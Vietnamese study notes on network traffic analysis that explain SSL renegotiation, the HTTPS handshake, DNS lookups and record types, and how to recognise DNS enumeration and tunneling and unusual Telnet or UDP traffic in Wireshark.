Thay vì kết thúc kết nối **SSL** và bắt đầu lại từ đầu, **SSL renegotiation** sẽ diễn ra. Trình duyệt của bạn và máy chủ đồng ý thực hiện một **SSL handshake** mới trong phiên **SSL** hiện tại. Quá trình này cho phép họ cập nhật các khóa mã hóa, xác thực lại nếu cần, hoặc thực hiện các điều chỉnh cần thiết khác.

Về bản chất, **SSL renegotiation** giống như làm mới thông tin bảo mật của bạn mà không cần đăng xuất và đăng nhập lại. Nó đảm bảo rằng dữ liệu của bạn vẫn được bảo mật trong suốt quá trình tương tác với trang web mà không gây ra bất kỳ gián đoạn hoặc chậm trễ nào.

Mặc dù **SSL renegotiation** duy trì bảo mật cho các kết nối trực tuyến, nhưng nó đòi hỏi sự phối hợp chính xác giữa client và server và có thể tiêu tốn thêm tài nguyên. Tuy nhiên, lợi ích của việc duy trì bảo mật không bị gián đoạn vượt trội hơn so với bất kỳ nhược điểm tiềm ẩn nào.



### HTTPs Breakdown

 HTTPs tích hợp mã hóa để cung cấp bảo mật cho các máy chủ và client web:

- **Transport Layer Security (TLS)**
- **Secure Sockets Layer (SSL)**

Nói chung, khi một client thiết lập kết nối HTTPs với một máy chủ, các bước sau sẽ diễn ra:

- **Handshake**: Máy chủ và client thực hiện một quá trình bắt tay (handshake) khi thiết lập kết nối HTTPs. Trong quá trình này, client và máy chủ đồng ý về các thuật toán mã hóa sẽ sử dụng và trao đổi các chứng chỉ của họ.
    
- **Encryption**: Sau khi hoàn thành quá trình handshake, client và máy chủ sử dụng thuật toán mã hóa đã được thỏa thuận trước đó để mã hóa dữ liệu truyền tải giữa họ.
    
- **Further Data Exchange**: Khi kết nối mã hóa đã được thiết lập, client và máy chủ sẽ tiếp tục trao đổi dữ liệu với nhau. Dữ liệu này có thể là các trang web, hình ảnh, hoặc các tài nguyên web khác.
    
- **Decryption**: Khi client truyền dữ liệu đến máy chủ hoặc ngược lại, họ phải giải mã dữ liệu này bằng các khóa công khai và khóa riêng.
    

Một trong những tấn công phổ biến dựa trên HTTPs là **SSL renegotiation**, trong đó kẻ tấn công sẽ thương lượng phiên kết nối xuống mức mã hóa thấp nhất có thể.



![[Pasted image 20240830163951.png]]


|**Handshake Step**|**Relevant Calculations**|
|---|---|
|`Client Hello`|`ClientHello = { ClientVersion, ClientRandom, Ciphersuites, CompressionMethods }`|
|`Server Hello`|`ServerHello = { ServerVersion, ServerRandom, Ciphersuite, CompressionMethod` }|
|`Certificate Exchange`|`ServerCertificate = { ServerPublicCertificate }`|
|`Key Exchange`|- `ClientDHPrivateKey`<br>- `ClientDHPublicKey = DH_KeyGeneration(ClientDHPrivateKey)`<br>- `ClientKeyExchange = { ClientDHPublicKey }`<br>- `ServerDHPrivateKey`<br>- `ServerDHPublicKey = DH_KeyGeneration(ServerDHPrivateKey)`<br>- `ServerKeyExchange = { ServerDHPublicKey }`|
|`Premaster Secret`|- `PremasterSecret = DH_KeyAgreement(ServerDHPublicKey, ClientDHPrivateKey)`<br>- `PremasterSecret = DH_KeyAgreement(ClientDHPublicKey, ServerDHPrivateKey)`|
|`Session Key Derivation`|`MasterSecret = PRF(PremasterSecret, "master secret", ClientNonce + ServerNonce`)|
||`KeyBlock = PRF(MasterSecret, "key expansion", ServerNonce + ClientNonce)`|
|`Extraction of Session Keys`|- `ClientWriteMACKey = First N bytes of KeyBlock`<br>- `ServerWriteMACKey = Next N bytes of KeyBlock`<br>- `ClientWriteKey = Next N bytes of KeyBlock`<br>- `ServerWriteKey = Next N bytes of KeyBlock`<br>- `ClientWriteIV = Next N bytes of KeyBlock`<br>- `ServerWriteIV = Next N bytes of KeyBlock`|
|`Finished Messages`|`FinishedMessage = PRF(MasterSecret, "finished", Hash(ClientHello + ServerHello))`|

### Finding SSL Renegotiation Attacks

* Man - in -the -middle*

![[Pasted image 20240830164855.png]]
```
ssl.record.content_type == 22
```

+ Thường có rất nhiều Client Hellos trong thời gian ngắn -> dấu hiệu dễ nhận biết nhất -> lặp lại thông báo này để kích hoạt đàm phán lại và hy vọng nhận được bộ mật mã thấp hơn.
+ **Out of Order Handshake Messages** - một số gói tin không theo thứ tự do mất gói tin hoặc các nguyên nhân khác, nhưng trong trường hợp **SSL renegotiation**, một số dấu hiệu rõ ràng sẽ là máy chủ nhận được **client hello** sau khi quá trình handshake đã hoàn tất.


## Peculiar DNS Traffic

### DNS Queries
Truy vấn DNS được sử dụng khi client muốn phân giải tên miền bằng địa chỉ IP hoặc ngược lại. Đầu tiên, chúng ta có thể khám phá loại truy vấn phổ biến nhất, đó là tra cứu chuyển tiếp (forward lookups)
![[Pasted image 20240830165601.png]]

- Request:
    - `Where is google.com?`
- Response:
    - ` 192.168.10.6`


1. **Query Initiation** | Khi người dùng muốn truy cập vào một địa chỉ như **google.com**, nó sẽ khởi tạo một yêu cầu truy vấn **DNS forward**.
2. **Local Cache Check** | Client sau đó kiểm tra bộ nhớ cache **DNS** cục bộ của mình để xem liệu đã có giải quyết tên miền thành địa chỉ **IP** hay chưa. Nếu chưa có, nó sẽ tiếp tục với các bước sau.
3. **Recursive Query** | Client sau đó gửi truy vấn đệ quy của mình đến máy chủ **DNS** đã được cấu hình (cục bộ hoặc từ xa).
4. **Root Servers** | **DNS resolver**, nếu cần, sẽ bắt đầu bằng cách truy vấn các máy chủ tên gốc để tìm các máy chủ tên có thẩm quyền cho **top-level domain (TLD)**. Có 13 máy chủ gốc được phân bố trên toàn thế giới.
5. **TLD Servers** | Máy chủ gốc sau đó phản hồi với các máy chủ tên có thẩm quyền cho **TLD** (ví dụ như **.com** hoặc **.org**).
6. **Authoritative Servers** | **DNS resolver** sau đó truy vấn các máy chủ tên có thẩm quyền của **TLD** để tìm tên miền cấp hai (ví dụ như **google.com**).
7. **Domain Name's Authoritative Servers** | Cuối cùng, **DNS resolver** truy vấn các máy chủ tên có thẩm quyền của tên miền để nhận địa chỉ **IP** liên quan đến tên miền được yêu cầu (ví dụ như **google.com**).
8. **Response** | **DNS resolver** sau đó nhận được địa chỉ **IP** (**A** hoặc **AAAA record**) và gửi lại cho client đã khởi tạo truy vấn.

### DNS Reverse Lookups/Queries
Ngược lại với cái trên khi đã biết địa chỉ IP và muốn tìm FQDN (Fully Qualified Domain Name)
- Request:
    - `What is your name 192.168.10.6?`
- Response:
    
    - `google.com :)`

![[Pasted image 20240830170246.png]]

- **Query Initiation** | Client gửi một truy vấn **DNS reverse** đến **DNS resolver** (máy chủ) đã được cấu hình với địa chỉ **IP** mà nó muốn tìm tên miền.
- **Reverse Lookup Zones** | **DNS resolver** kiểm tra xem nó có quyền quản lý vùng tra cứu ngược (reverse lookup zone) tương ứng với dải địa chỉ **IP** được xác định bởi địa chỉ **IP** nhận được hay không. Ví dụ, với địa chỉ **192.0.2.1**, vùng tra cứu ngược sẽ là **1.2.0.192.in-addr.arpa**.
- **PTR Record Query** | **DNS resolver** sau đó tìm kiếm một **PTR record** trong vùng tra cứu ngược tương ứng với địa chỉ **IP** được cung cấp.
- **Response** | Nếu tìm thấy một **PTR record** khớp, máy chủ **DNS** (resolver) sẽ trả lại **FQDN** của địa chỉ **IP** cho client.

### DNS Record Types

| **Record Type**              | **Description**                                                                              |
| ---------------------------- | -------------------------------------------------------------------------------------------- |
| **A (Address)**              | Bản ghi này ánh xạ tên miền đến một địa chỉ **IPv4**.                                        |
| **AAAA (IPv6 Address)**      | Bản ghi này ánh xạ tên miền đến một địa chỉ **IPv6**.                                        |
| **CNAME (Canonical Name)**   | Bản ghi này tạo một bí danh cho tên miền. Ví dụ **hello.com** = **world.com**.               |
| **MX (Mail Exchange)**       | Bản ghi này chỉ định máy chủ thư chịu trách nhiệm nhận email cho tên miền.                   |
| **NS (Name Server)**         | Bản ghi này chỉ định các máy chủ tên có thẩm quyền cho một tên miền.                         |
| **PTR (Pointer)**            | Bản ghi này được sử dụng trong các truy vấn ngược để ánh xạ một địa chỉ **IP** đến tên miền. |
| **TXT (Text)**               | Bản ghi này được sử dụng để chỉ định văn bản liên quan đến tên miền.                         |
| **SOA (Start of Authority)** | Bản ghi này chứa thông tin quản trị về vùng (zone).                                          |

### Finding DNS Enumeration Attempts

https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns


=> cho phép xác định tất cả các bản ghi DNS được liên kết với một miền để khám phá các lỗ hổng, lập bản đồ các thiết bị kết nối Internet của công ty và hiển thị các dịch vụ ẩn.

![[Pasted image 20240830170638.png]]

![[Pasted image 20240830170646.png]]

=> Đây sẽ là dấu hiệu rõ ràng về việc liệt kê DNS và thậm chí có thể là việc liệt kê tên miền phụ từ Attacker

### Finding DNS Tunneling
![[Pasted image 20240830170930.png]]
Đôi khi nó thường bị mã hóa nhiều lớp 
![[Pasted image 20240830170946.png]]


=> Đặt biệt cần phải lưu ý tới các DNS dạng IPFS

https://developers.cloudflare.com/web3/ipfs-gateway/concepts/ipfs/



## Strange Telnet & UDP Connections

![[Pasted image 20240830171104.png]]
**Telnet** là một giao thức mạng cho phép phiên giao tiếp tương tác hai chiều giữa hai thiết bị qua mạng. Giao thức này được phát triển vào những năm 1970 và được định nghĩa trong **RFC 854**. Tuy nhiên, việc sử dụng **Telnet** đã giảm đáng kể so với **SSH**.

Trong nhiều trường hợp cũ, như các máy chạy **Windows NT**, chúng có thể vẫn sử dụng **Telnet** để cung cấp khả năng điều khiển từ xa cho **Microsoft Terminal Services**.

Tuy nhiên, cần luôn cảnh giác với các liên lạc **Telnet** kỳ lạ và bất thường vì nó cũng có thể được kẻ tấn công sử dụng cho các mục đích xấu như **data exfiltration** và **tunneling**.

### Finding Traditional Telnet Traffic Port 23


![[Pasted image 20240830171221.png]]

Lưu lượng truy cập telnet có xu hướng được giải mã và có thể dễ dàng kiểm tra, nhưng giống như ICMP, DNS và các phương pháp tạo đường hầm khác, kẻ tấn công có thể mã hóa và mã hóa hoặc làm xáo trộn văn bản này :)
![[Pasted image 20240830171258.png]]

### Unrecognized TCP Telnet in Wireshark

Telnet chỉ là một giao thức liên lạc và do đó kẻ tấn công có thể dễ dàng chuyển sang cổng khác.
![[Pasted image 20240830171337.png]]
=> Nhiều liên lạc qua cổng 9999
![[Pasted image 20240830171357.png]]

![[Pasted image 20240830171405.png]]

### Telnet Protocol through IPv6

Trừ khi mạng cục bộ của chúng ta được định cấu hình để sử dụng IPv6, việc quan sát lưu lượng IPv6 có thể là dấu hiệu cho thấy các hành động xấu trong môi trường -> có thể nhận thấy việc sử dụng địa chỉ IPv6 cho telnet như sau.

![[Pasted image 20240830171446.png]]
=> fillter TELNET

![[Pasted image 20240830171507.png]]
=> 
![[Pasted image 20240830171515.png]]


### Watching UDP Communications

Mặt khác, attackers có thể chọn sử dụng kết nối UDP qua TCP 

![[Pasted image 20240830171551.png]]

*Một trong những khía cạnh khác biệt lớn nhất giữa TCP và UDP là UDP không có kết nối và cung cấp khả năng truyền nhanh. *

![[Pasted image 20240830171615.png]]
thay vì chuỗi SYN, SYN/ACK, ACK, các thông tin liên lạc sẽ được gửi ngay lập tức đến người nhận. 

![[Pasted image 20240830171640.png]]
